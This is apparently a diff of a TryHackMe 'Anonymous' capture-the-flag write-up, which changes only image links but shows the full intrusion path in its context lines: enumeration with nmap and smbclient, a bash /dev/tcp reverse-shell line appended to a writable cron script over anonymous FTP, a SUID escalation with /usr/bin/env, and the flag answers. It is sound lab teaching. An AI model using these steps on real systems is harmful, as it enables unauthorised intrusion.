@@ -1,7 +1,7 @@
 ![Anonymous Banner](https://i.imgur.com/KHhJB15.png)
 
 <p align="center">
-   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/anonymous_Cover.png" alt="Anonymous">
+   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/anonymous_Cover.png" alt="Anonymous">
 </p>
 
 # [Anonymous](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/anonymous)
@@ -22,7 +22,7 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    nmap -sV 10.10.147.121
    ```
    
-   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Nmap_Scan.png)
+   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_Scan.png)
 
    ><details><summary>Click for answer</summary>4</details>
 
@@ -46,7 +46,7 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    smbclient -NL //10.10.11.32
    ```
    
-   ![Smb Shares](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Smb_Shares.png)
+   ![Smb Shares](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Smb_Shares.png)
       
    To view the contents of this share we can use:
    
@@ -54,13 +54,13 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    smbclient -N //10.10.11.32/pics
    ```
    
-   ![Smb Share](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Nmap_Smb.png)
+   ![Smb Share](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_Smb.png)
 
    After going through these files, it appears they are just images of some dogs, which have no further use.
    
-   ![SMB Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Nmap_Smb_Files.png)
+   ![SMB Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_Smb_Files.png)
    
-   ![Images](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Dogs.png)
+   ![Images](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Dogs.png)
 
    ><details><summary>Click for answer</summary>pics</details>
 
@@ -72,23 +72,23 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    ftp 10.10.75.132
    ```
    
-   ![FTP Log In](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Ftp_Log_In.png)
+   ![FTP Log In](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Ftp_Log_In.png)
    
    Looking through the files we see three files in a scripts folder which may be of interest.
    
-   ![FTP Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Ftp_Files.png)
+   ![FTP Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Ftp_Files.png)
    
    We can download them all to our machine to investigate with `mget *`.
    
-   ![FTP Download Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Ftp_Download.png)
+   ![FTP Download Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Ftp_Download.png)
    
    Looks like the `clean.sh` file is a script that runs periodically to remove some files. This gets stored in the log file. We also note that we have write access to this script. 
    
-   ![Removed Files Log](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Removed_Files_Log.png)
+   ![Removed Files Log](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Removed_Files_Log.png)
    
    Lets find a command for a reverse shell we can add to this files. We can use [pentestmonkeys](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for this.
    
-   ![Reverse Shell Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Reverse_Shell_Command.png)
+   ![Reverse Shell Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Reverse_Shell_Command.png)
    
    We can now append this to the script we downloaded.
    
@@ -96,7 +96,7 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
    ```
    
-   ![Finished Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Finished_Script.png)
+   ![Finished Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Finished_Script.png)
    
    Now all we have to do, is upload the file to the server. Set up a listener and wait for the script to run.
    
@@ -104,7 +104,7 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    put clean.sh
    ```
    
-   ![FTP Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Ftp_Upload.png)
+   ![FTP Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Ftp_Upload.png)
    
    We can check if the command was added using:
    
@@ -112,7 +112,7 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    curl ftp://10.10.75.132/scripts/clean.sh
    ```
    
-   ![Check Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Check_Script.png)
+   ![Check Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Check_Script.png)
    
    Now we setup the listener and wait for the incoming connection to be made.
    
@@ -120,11 +120,11 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    nc -nlvp 1337
    ```
    
-   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Nmap_Reverse_Shell.png)
+   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_Reverse_Shell.png)
    
    Now it is time to navigate to the flag and read its contents.
    
-   ![User Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Nmap_User.png)
+   ![User Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_User.png)
 
    ><details><summary>Click for answer</summary>90d6f992585815ff991e68748c414740</details>
 
@@ -136,11 +136,11 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    find / -perm -4000 2>/dev/null
    ```
    
-   ![Shell SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Shel_SUID.png)
+   ![Shell SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Shel_SUID.png)
    
    We can use GTFOBins to look for any binaries which don't need sudo or a password. From this list we can use `/usr/bin/env`.
    
-   ![GTFO](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_GTFO.png)
+   ![GTFO](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_GTFO.png)
    
    Now we can use this command to get root access on the machine.
    
@@ -148,10 +148,10 @@ This guide contains the answer and steps necessary to get to them for the [Anony
    /usr/bin/env bin/bash -p
    ```
    
-   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Root.png)
+   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Root.png)
    
    After a quick check to verify we are indeed root, we can look at the contents of `root.txt`.
    
-   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Root_Flag.png)
+   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Root_Flag.png)
 
    ><details><summary>Click for answer</summary>4d930091c31a622a7ed10f27999af363</details>
